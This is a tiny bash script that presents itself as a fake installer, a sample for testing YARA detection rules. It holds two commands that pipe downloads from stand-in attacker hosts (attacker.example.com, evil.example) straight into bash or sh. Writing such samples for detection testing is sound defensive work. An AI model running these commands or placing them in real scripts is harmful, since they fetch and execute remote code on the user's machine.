#!/bin/bash
# Fake installer with classic curl|bash anti-pattern for YARA testing
curl -sL https://attacker.example.com/payload.sh | bash
wget http://evil.example/x.sh -O - | sh
